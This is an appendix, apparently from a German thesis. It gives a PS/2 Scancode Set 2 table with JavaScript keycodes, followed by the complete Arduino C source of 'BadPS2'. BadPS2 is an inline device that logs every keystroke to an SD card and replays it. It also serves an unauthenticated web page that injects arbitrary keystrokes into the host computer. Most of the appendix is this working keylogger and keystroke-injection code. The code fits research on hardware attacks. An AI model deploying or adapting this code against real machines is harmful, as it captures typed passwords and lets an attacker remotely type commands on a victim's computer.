\chapter{Anhang}
\section{PS/2-Tastatur Scancode-Set 2}
\label{scancode_set_2}
Die Angaben in der folgenden Tabelle sind Hexadezimalwerte für Tastaturen mit 101-, 102- oder 104-Tasten. Es wird die Taste mit den zugehörigen Make- und Break-Codes des Scancode-Sets 2 dargestellt. Außerdem sind die entsprechenden JavaScript Keycodes mit aufgelistet, jedoch existieren für vier Tasten keine Keycodes.

\begin{longtable}{| p{.20\textwidth} | p{.20\textwidth} | p{.20\textwidth} | p{.20\textwidth} |}
  \hline
  \textbf{Key} & \textbf{Make} & \textbf{Break} & \textbf{JavaScript}\\ \hline
  A & 1c & f0 1c & 65 \\ \hline
  B & 32 & f0 32 & 66 \\ \hline
  C & 21 & f0 21 & 67 \\ \hline
  D & 23 & f0 23 & 68 \\ \hline
  E & 24 & f0 24 & 69 \\ \hline
  F & 2b & f0 2b & 70 \\ \hline
  G & 34 & f0 34 & 71 \\ \hline
  H & 33 & f0 33 & 72 \\ \hline
  I & 43 & f0 43 & 73 \\ \hline
  J & 3b & f0 3b & 74 \\ \hline
  K & 42 & f0 42 & 75 \\ \hline
  L & 4b & f0 4b & 76 \\ \hline
  M & 3a & f0 3a & 77 \\ \hline
  N & 31 & f0 31 & 78 \\ \hline
  O & 44 & f0 44 & 79 \\ \hline
  P & 4d & f0 4d & 80 \\ \hline
  Q & 15 & f0 15 & 81 \\ \hline
  R & 2d & f0 2d & 82 \\ \hline
  S & 1b & f0 1b & 83 \\ \hline
  T & 2c & f0 2c & 84 \\ \hline
  U & 3c & f0 3c & 85 \\ \hline
  V & 2a & f0 2a & 86 \\ \hline
  W & 1d & f0 1d & 87 \\ \hline
  X & 22 & f0 22 & 88 \\ \hline
  Y & 35 & f0 35 & 89 \\ \hline
  Z & 1a & f0 1a & 90 \\ \hline
  0 & 45 & f0 45 & 48 \\ \hline
  1 & 16 & f0 16 & 49 \\ \hline
  2 & 1e & f0 1e & 50 \\ \hline
  3 & 26 & f0 26 & 51 \\ \hline
  4 & 25 & f0 25 & 52 \\ \hline
  5 & 2e & f0 2e & 53 \\ \hline
  6 & 36 & f0 36 & 54 \\ \hline
  7 & 3d & f0 3d & 55 \\ \hline
  8 & 3e & f0 3e & 56 \\ \hline
  9 & 46 & f0 46 & 57 \\ \hline
  ‘ & 0e & f0 0e & 192 \\ \hline
  - & 4e & f0 4e & 189 \\ \hline
  = & 55 & f0 55 & 187 \\ \hline
  \textbackslash & 5d & f0 5d & 220 \\ \hline
  BKSP & 66 & f0 66 & 8 \\ \hline
  SPACE & 29 & f0 29 & 32 \\ \hline
  TAB & 0d & f0 0d & 9 \\ \hline
  CAPS & 58 & f0 58 & 20 \\ \hline
  L SHFT & 12 & f0 12 & 16 \\ \hline
  L CTRL & 14 & f0 14 & 17 \\ \hline
  L GUI & e0 1f & e0 f0 1f & 91 \\ \hline
  L ALT & 11 & f0 11 & 18 \\ \hline
  R SHFT & 59 & f0 59 &   \\ \hline
  R CTRL & e0 14 & e0 f0 14 &   \\ \hline
  R GUI & e0 27 & e0 f0 27 & 92 \\ \hline
  R ALT & e0 11 & e0 f0 11 &   \\ \hline
  APPS & e0 2f & e0 f0 2f & 93 \\ \hline
  ENTER & 5a & f0 5a & 13 \\ \hline
  ESC & 76 & f0 76 & 27 \\ \hline
  F1 & 05 & f0 05 & 112 \\ \hline
  F2 & 06 & f0 06 & 113 \\ \hline
  F3 & 04 & f0 04 & 114 \\ \hline
  F4 & 0c & f0 0c & 115 \\ \hline
  F5 & 03 & f0 03 & 116 \\ \hline
  F6 & 0b & f0 0b & 117 \\ \hline
  F7 & 83 & f0 83 & 118 \\ \hline
  F8 & 0a & f0 0a & 119 \\ \hline
  F9 & 01 & f0 01 & 120 \\ \hline
  F10 & 09 & f0 09 & 121 \\ \hline
  F11 & 78 & f0 78 & 122 \\ \hline
  F12 & 07 & f0 07 & 123 \\ \hline
  PRNT SCRN & e0 12 e0 7c & e0 f0 7c e0 f0 12 &  \\ \hline
  SCROLL & 7e & f0 7e & 145 \\ \hline
  PAUSE & e1 14 77 e1 f0 14 f0 77 & -none- & 19 \\ \hline
  [ & 54 & f0 54 & 219 \\ \hline
  INSERT & e0 70 & e0 f0 70 & 45 \\ \hline
  HOME & e0 6c & e0 f0 6c & 36 \\ \hline
  PG UP & e0 7d & e0 f0 7d & 33 \\ \hline
  DELETE & e0 71 & e0 f0 71 & 46 \\ \hline
  END & e0 69 & e0 f0 69 & 35 \\ \hline
  PG DN & e0 7a & e0 f0 7a & 34 \\ \hline
  U ARROW & e0 75 & e0 f0 75 & 38 \\ \hline
  L ARROW & e0 6b & e0 f0 6b & 37 \\ \hline
  D ARROW & e0 72 & e0 f0 72 & 40 \\ \hline
  R ARROW & e0 74 & e0 f0 74 & 39 \\ \hline
  NUM & 77 & f0 77 & 144 \\ \hline
  KP / & e0 4a & e0 f0 4a & 111 \\ \hline
  KP * & 7c & f0 7c & 106 \\ \hline
  KP - & 7b & f0 7b & 109 \\ \hline
  KP + & 79 & f0 79 & 107 \\ \hline
  KP EN & e0 5a & e0 f0 5a &  \\ \hline
  KP . & 71 & f0 71 & 110 \\ \hline
  KP 0 & 70 & f0 70 & 96 \\ \hline
  KP 1 & 69 & f0 69 & 97 \\ \hline
  KP 2 & 72 & f0 72 & 98 \\ \hline
  KP 3 & 7a & f0 7a & 99 \\ \hline
  KP 4 & 6b & f0 6b & 100 \\ \hline
  KP 5 & 73 & f0 73 & 101 \\ \hline
  KP 6 & 74 & f0 74 & 102 \\ \hline
  KP 7 & 6c & f0 6c & 103 \\ \hline
  KP 8 & 75 & f0 75 & 104 \\ \hline
  KP 9 & 7d & f0 7d & 105 \\ \hline
  ] & 5b & f0 5b & 221 \\ \hline
  ; & 4c & f0 4c & 186 \\ \hline
  ' & 52 & f0 52 & 222 \\ \hline
  , & 41 & f0 41 & 188 \\ \hline
  . & 49 & f0 49 & 190 \\ \hline
  / & 4a & f0 4a & 191 \\ \hline
\end{longtable}



\thispagestyle{empty}
\cleardoublepage
\section{Quellcode}
\label{source_code}
Der hier dargestellte Quellcode \cite{badps2} wurde auf den Arduino Mikrocontroller übertragen und befindet sich zudem auf der beigelegten CD-ROM. Dieser ist in der Programmiersprache C geschrieben und enthält Anteile in HTML und JavaScript.

\begin{lstlisting}[language=C,caption={Arduino},captionpos=b,basicstyle=\small,frame=single,breaklines=true]
#include <SPI.h>
#include <Ethernet.h>
#include <SD.h>
int dataPinIn = 2;
int clockPinIn = 3;
int dataPinOut = 18;
int clockPinOut = 19;
int sdPin = 10;
int readerPin = 44;
int writerPin = 46;
int senderPin = 48;
char* filename = "data.txt";
byte mac[] = {0x90, 0xa2, 0xda, 0x0e, 0x0c, 0x2d};
byte ip[] = {192, 168, 2, 177};
EthernetServer webServer(80);


void setup() {
  pinMode(readerPin, INPUT);
  pinMode(writerPin, INPUT);
  pinMode(senderPin, INPUT);
  delay(1000);
  Serial.begin(9600);
  initKeys(dataPinIn, clockPinIn);
  initCard(sdPin);
  Ethernet.begin(mac, ip);
  webServer.begin();
}


void loop() {
  if (digitalRead(readerPin) == HIGH) {
    reader(filename);
  }
  else if (digitalRead(writerPin) == HIGH) {
    writer(filename);
    delay(1000);
    exit(0);
  }
  else if (digitalRead(senderPin) == HIGH) {
    website(webServer);
  }
  else {
    Serial.println("No function selected");
    delay(1000);
  }
}


/*****************************************************
 * Functionalities
 *****************************************************/

void reader(char* filename) {
  unsigned char data = readKeys(dataPinIn, clockPinIn);
  if (data) {
    writeKeys(dataPinOut, clockPinOut, data);
    String content = String(data, HEX) + " ";
    if (data < 0x10) content = "0" + content;
    Serial.print(content);
    writeFile(filename, content);
  }
  else Serial.println("Error reading keyboard");
}


void sender(String content, char* separator) {
  int place;
  unsigned char data;
  do {
    place = content.indexOf(separator);
    if (place != -1) {
      data = (unsigned char) strtol(content.substring(0, place).c_str(), NULL, 16);
      Serial.println(data, HEX);
      if (data == 0x00) delay(2000);
      else writeKeys(dataPinOut, clockPinOut, data);
      place += 1;
      content = content.substring(place, content.length());
    } else if (content.length() > 0) Serial.println(content);
  } while (place >= 0);
}


void writer(char* filename) {
  String content = readFile(filename);
  Serial.println("Content of " + String(filename));
  sender(content, " ");
}


void website(EthernetServer webServer) {
  EthernetClient client = webServer.available();
  if (client) {
    String buffer;
    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        buffer += c;
        if (c == '\n') {
          if (buffer.indexOf("favicon") == -1) {
            sendWebsite(client);
            int first = buffer.indexOf("scan=") + 5;
            String data = buffer.substring(first);
            int last = data.indexOf(" ");
            sender(data.substring(0, last), "+");
            break;
          }
        }
      }
    }
    delay(1);
    client.stop();
  }
}


/*****************************************************
 * Keyboard
 *****************************************************/

void initKeys(int dataPin, int clockPin) {
  setHigh(clockPin);
  setHigh(dataPin);
  sendCommand(dataPin, clockPin, 0xff);
  readKeys(dataPin, clockPin);
  readKeys(dataPin, clockPin);
  Serial.println("Keyboard initialized");
}


void setHigh(int pin) {
  pinMode(pin, INPUT);
  digitalWrite(pin, HIGH);
}


void setLow(int pin) {
  pinMode(pin, OUTPUT);
  digitalWrite(pin, LOW);
}


unsigned char readKeys(int dataPin, int clockPin) {
  unsigned char data = 0x00;
  unsigned char bit = 0x01;
  setHigh(clockPin);
  setHigh(dataPin);
  delayMicroseconds(50);
  while (digitalRead(clockPin) == HIGH);
  while (digitalRead(clockPin) == LOW);
  for (int i=0; i<8; i++) {
    while (digitalRead(clockPin) == HIGH);
    if (digitalRead(dataPin) == HIGH) data = data | bit;
    while (digitalRead(clockPin) == LOW);
    bit = bit << 1;
  }
  while (digitalRead(clockPin) == HIGH);
  while (digitalRead(clockPin) == LOW);
  while (digitalRead(clockPin) == HIGH);
  while (digitalRead(clockPin) == LOW);
  setLow(clockPin);
  return data;
}


void writeKeys(int dataPin, int clockPin, unsigned char data) {
  unsigned char parity = 1;
  setLow(dataPin);
  setLow(clockPin);
  delayMicroseconds(50);
  setHigh(clockPin);
  for (int i=0; i<8; i++) {
    if (data & 0x01) setHigh(dataPin);
    else setLow(dataPin);
    setLow(clockPin);
    delayMicroseconds(50);
    setHigh(clockPin);
    parity = parity ^ (data & 0x01);
    data = data >> 1;
  }
  if (parity) setHigh(dataPin);
  else setLow(dataPin);
  setLow(clockPin);
  delayMicroseconds(50);
  setHigh(clockPin);
  setHigh(dataPin);
  setLow(clockPin);
  delayMicroseconds(50);
  setHigh(clockPin);
}


void sendCommand(int dataPin, int clockPin, unsigned char data) {
  unsigned char parity = 1;
  setHigh(dataPin);
  setHigh(clockPin);
  delayMicroseconds(300);
  setLow(clockPin);
  delayMicroseconds(300);
  setLow(dataPin);
  delayMicroseconds(10);
  setHigh(clockPin);
  while (digitalRead(clockPin) == HIGH);
  for (int i=0; i<8; i++) {
    if (data & 0x01) setHigh(dataPin);
    else setLow(dataPin);
    while (digitalRead(clockPin) == LOW);
    while (digitalRead(clockPin) == HIGH);
    parity = parity ^ (data & 0x01);
    data = data >> 1;
  }
  if (parity) setHigh(dataPin);
  else setLow(dataPin);
  while (digitalRead(clockPin) == LOW);
  while (digitalRead(clockPin) == HIGH);
  setHigh(dataPin);
  delayMicroseconds(50);
  while (digitalRead(clockPin) == HIGH);
  while ((digitalRead(clockPin) == LOW) || (digitalRead(dataPin) == LOW));
  setLow(clockPin);
}


/*****************************************************
 * SD Card
 *****************************************************/

void initCard(int sdPin) {
  pinMode(sdPin, OUTPUT);
  digitalWrite(sdPin, HIGH);
  if (!SD.begin(4)) Serial.println("Error finding SD card");
  else Serial.println("SD card initialized");
}


String readFile(char* filename) {
  String content;
  if (SD.exists(filename)) {
    File file = SD.open(filename, FILE_READ);
    while (file.available()) content.concat((char) file.read());
    file.close();
  }
  else Serial.println("Error finding " + String(filename));
  return content;
}


void writeFile(char* filename, String content) {
  File file = SD.open(filename, FILE_WRITE);
  if (file) {
    file.print(content);
    file.close();
  }
  else Serial.println("Error writing " + String(filename));
}


/*****************************************************
 * Website
 *****************************************************/

void sendWebsite(EthernetClient client) {
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: text/html");
  client.println("Connection: close");
  client.println();
  client.print("<!DOCTYPE html><html><head><title>BadPS2 Input</title><meta charset='utf-8'></head><body><h1>BadPS2 Input</h1>Press keys to create PS/2 scancodes.<br />Click send to execute the keystrokes on the host.<br /><br /><form method='GET' action='/'><textarea id='scan' name='scan' rows='5' cols='33' readonly></textarea><br /><input type='button' onclick='deleteLast();' value='Delete' /><input type='button' onclick='deleteAll();' value='Delete All' /><input type='button' onclick='insertDelay();' value='Insert Delay' /><input type='submit' value='Send' /></form>");
  client.print("<script type='text/javascript'>function deleteLast(){scan.value=scan.value.substr(0,scan.value.lastIndexOf(' '))}function deleteAll(){scan.value=''}function insertDelay(){scan.value+=scan.value?' 00':'00'}var keys={8:'66',9:'0d',13:'5a',16:'12',17:'14',18:'11',19:'e1 14 77 e1 f0 14 f0 77',20:'58',27:'76',32:'29',33:'e0 7d',34:'e0 7a',35:'e0 69',36:'e0 6c',37:'e0 6b',38:'e0 75',39:'e0 74',40:'e0 72',45:'e0 70',46:'e0 71',48:'45',49:'16',50:'1e',51:'26',52:'25',53:'2e',54:'36',55:'3d',56:'3e',57:'46',65:'1c',66:'32',67:'21',68:'23',69:'24',70:'2b',71:'34',72:'33',73:'43',74:'3b',75:'42',76:'4b',77:'3a',78:'31',79:'44',80:'4d',81:'15',82:'2d',83:'1b',84:'2c',85:'3c',86:'2a',87:'1d',88:'22',89:'35',90:'1a',91:'e0 1f',92:'e0 27',93:'e0 2f',96:'70',97:'69',98:'72',99:'7a',100:'6b',101:'73',102:'74',103:'6c',104:'75',105:'7d',106:'7c',107:'79',109:'7b',110:'71',111:'e0 4a',112:'05',113:'06',114:'04',115:'0c',116:'03',117:'0b',118:'83',119:'0a',120:'01',121:'09',122:'78',123:'07',144:'77',145:'7e',186:'4c',187:'55',188:'41',189:'4e',190:'49',191:'4a',192:'0e',219:'54',220:'5d',221:'5b',222:'52'},scan=document.getElementById('scan');document.onkeydown=function(e){scan.value=scan.value?scan.value+' '+keys[e.keyCode]:keys[e.keyCode]},document.onkeyup=function(e){19!==e.keyCode&&(scan.value+=keys[e.keyCode].length>2?' '+keys[e.keyCode].substr(0,2)+' f0 '+keys[e.keyCode].substr(3):' f0 '+keys[e.keyCode])};</script></body></html>");
}
\end{lstlisting}